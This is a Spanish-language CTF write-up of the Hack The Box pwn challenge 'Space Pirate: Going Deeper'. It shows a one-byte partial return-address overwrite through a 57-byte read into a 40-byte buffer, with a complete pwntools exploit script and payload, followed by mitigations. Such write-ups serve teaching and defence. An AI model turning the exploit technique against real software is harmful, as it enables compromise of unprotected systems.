---
challenge: "Space Pirate: Going Deeper"
category: Challenge
type: pwn
os: Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, partial-overwrite, x86-64, pwntools, gdb]
---

# Space Pirate: Going Deeper — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired por evidencia de writeups públicos; no comprobado con sesión en HTB.
> Sin flags ni direcciones de la instancia real.

## TL;DR

`admin_panel()` reserva 40 bytes y lee 57: un desbordamiento de pila de un solo byte sobre el retorno. El binario no tiene PIE ni canario, así que basta cambiar el byte bajo de la dirección de retorno para saltar a la rama que ejecuta `system("cat flag*")`. El payload son 56 bytes de relleno y `\x01`.

## Enunciado y superficie

- Categoría **Pwn**, dificultad **Very Easy**, ELF x86-64 y una instancia remota.
- Menú con tres opciones: desactivar mecanismos, iniciar sesión o salir.
- La pista está en los valores que imprime: `a = [1], b = [2], c = [3]`, aunque la función compara con `0xdeadbeef`, `0x1337c0de` y `0x1337beef`.

```bash
file sp_going_deeper
checksec --file=sp_going_deeper
```

```text
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

La combinación «sin canario y sin PIE» convierte un byte de desbordamiento en control de flujo.

## Reconocimiento

```text
 1. Disable mechanisms ⚙️
 2. Login ✅
 3. Exit 🏃
 >>
```

Las dos primeras opciones llegan al mismo `read(0, local_38, 0x39)`; la tercera sale. El binario no está `strip`, así que `admin_panel` aparece por su nombre.

```bash
objdump -d -M intel sp_going_deeper | sed -n '/<admin_panel>:/,/^$/p'
```

## Análisis del código

La función recibe tres parámetros y los compara con constantes:

```c
void admin_panel(long a, long b, long c) {
    char local_38[40];
    long local_10 = 0;
    ...
    read(0, local_38, 0x39);          // 57 bytes en un búfer de 40

    if (a == 0xdeadbeef && b == 0x1337c0de && c == 0x1337beef) {
        if (strncmp("DRAEGER...", local_38, 0x34) != 0) {
            printf("[+] Welcome admin! ...");
            system("cat flag*");
        }
    }
}
```

- `a`, `b` y `c` llegan como `1`, `2` y `3` desde `main`, nunca como las constantes: la condición es imposible por esa vía.
- La comparación de la contraseña está invertida (`!= 0` entra en el bloque), pero tampoco se puede alcanzar.
- `read` sí es explotable: 57 bytes sobre un búfer de 40 desbordan 17 bytes del marco.

## Explicación del fallo

El marco de `admin_panel` deja el búfer a `rbp-0x38` y el retorno a `rbp+0x08`:

```text
rbp-0x38  [ local_38, 40 bytes ]   <- read escribe 57
rbp-0x10  [ local_10, 8 bytes ]
rbp+0x00  [ saved RBP, 8 bytes ]
rbp+0x08  [ return address    ]    <- byte bajo modificable
```

Con 40 bytes se llena el búfer, 16 más cubren `local_10` y el `saved RBP`, y el byte 56 toca el byte menos significativo del retorno. El retorno original apunta a `0x400ba0` (la instrucción siguiente a la llamada en `main`); cambiando ese byte a `0x01` se salta a `0x400b01`, dentro de la rama que imprime el mensaje y ejecuta `system`.

No hace falta canario (no hay), ni filtrar PIE (no hay), ni ROP: es una **sobrescritura parcial** de un byte.

## Reproducción local

```bash
gdb -q ./sp_going_deeper
```

```gdb
run
# opción 1, y un patrón cíclico de 100 bytes
pattern create 100
pattern search $rsp
```

El offset hasta el retorno es 56. Para confirmar el destino:

```bash
objdump -d sp_going_deeper | grep -A2 "400afa\|400b01"
```

`0x400afa` es la rama alternativa que también llama a `printf`; `0x400b01` es la que carga el mensaje de bienvenida. Cualquiera de las dos sirve si el byte bajo coincide.

## Explotación

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = '<IP>', <PORT>
p = remote(HOST, PORT)

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b': ', b'A' * 56 + b'\x01')
print(p.recvall(timeout=5).decode(errors='replace'))
```

- El relleno debe ser exactamente 56 bytes: 40 del búfer + 8 de `local_10` + 8 del `saved RBP`.
- `b'\x01'` sustituye solo el byte bajo; los cinco bytes altos de la dirección no cambian.
- Si el binario se recompila, la dirección de la rama cambia y el byte hay que recalcularlo.
- No se envía salto de línea dentro del payload binario: `sendlineafter` añade el `\n` al final, después de los 57 bytes.

El resultado esperado es el mensaje de bienvenida y la salida de `cat flag*`.

## Evidencia

- `checksec` con `No canary` y `No PIE`.
- Offset 56 confirmado con `pattern search` sobre `$rsp`.
- Salida local con una flag de prueba, nunca la real.

## Lecciones aprendidas

- Un byte de desbordamiento basta cuando el binario no tiene PIE: no hace falta reescribir la dirección completa.
- El `read` de 57 bytes en un búfer de 40 es el fallo real; la condición imposible de los parámetros es una pista falsa.
- Entre el búfer y el retorno hay 16 bytes (`local_10` y `saved RBP`), no solo 8; contarlos mal desplaza el payload.
- `sendlineafter` añade un byte extra: en un payload binario conviene saber dónde cae.
- La rama de éxito está a un byte del retorno original; mirar el desensamblado ahorra un ROP entero.

## Mitigaciones y detección

- Sustituir `read(0, buf, 0x39)` por `read(0, buf, sizeof(buf))`.
- Compilar con `-fstack-protector-strong` y `-pie -fPIE`; el canario habría detenido el desbordamiento y PIE habría obligado a filtrar.
- No dejar ramas que ejecuten comandos con la flag detrás de comparaciones inalcanzables.
- Detección: caídas con `RIP` en el propio binario tras una entrada de 57 bytes; peticiones con 56 bytes de relleno y un byte de control.
- Referencias: CWE-121 (stack-based buffer overflow), MITRE T1190.

## Referencias

- <https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-going-deeper/>
- <https://www.hackthebox.com/blog/space-pirate-going-deeper-ca-ctf-2022-pwn-writeup>
- <https://cwe.mitre.org/data/definitions/121.html>
- <https://docs.pwntools.com/en/stable/tubes.html>
